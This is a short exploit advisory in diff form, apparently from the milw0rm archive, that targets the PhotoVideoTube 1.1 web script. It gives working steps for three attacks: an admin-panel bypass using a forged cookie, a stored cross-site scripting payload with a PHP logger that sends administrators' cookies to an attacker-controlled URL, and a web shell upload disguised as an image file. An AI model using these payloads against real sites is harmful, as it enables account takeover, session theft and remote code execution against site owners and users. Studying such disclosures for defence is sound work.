@@ -1,0 +1,45 @@
+  ___ ___         __                        
+ /   |   \_____  |  | _____  ___ ___________
+/    ~    \__  \ |  |/ /\  \/  // __ \_  __ \
+\    Y    // __ \|    <  >    <\  ___/|  | \/
+ \___|_  /(____  /__|_ \/__/\_ \\___  >__|  
+       \/      \/     \/      \/    \/   :: Egy Coders Team Researcher
+
+/- PhotoVideoTube v 1.1 => Multiple Vulnerabilities
+/- ( Insecure Cookie Handling & Cookie Grabber & Upload Shell )
+/- http://photovideotube.com/
+/- see demo script and executing vulnerabilities
+/- Greetz : ExH , ProViDoR , Error Code , Bright D@rk , Sinaritx
+
+* hi every body
+* this script have a three vulnerabilities the first one
+* cookie handling you can bypass control panel
+* paste this js code
+* javascript:document.cookie="username=admin";
+* then go to http://host/path/admin/main.php
+* now we are in a control panel
+
+* ok second vulnerability Cookie Grabber
+* first make file ( logger.php ) and paste this code in it
+            <?php
+            $cookie = $_GET['cookie'];
+            $logger = fopen("logger.txt", "a");
+            fwrite($logger, $cookie ."\n");
+            fclose($logger);
+            ?>
+* and chmod file to 777
+* now go to http://host/path/comment_pics.php?imgId=id
+* and write this comment
+* <script>document.location ="http://host/path/logger.php?cookie=" + document.cookie;</script>
+* and click submit
+* now if admin seen this picture cookie will sent to your logger.txt
+
+* third vulnerability
+* first make a account
+* and go to upload photos http://host/path/upload_pics.php
+* and upload shell like shell.php.jpg
+* then show shell
+
+* Be Safe
+
+# milw0rm.com [2009-05-22]
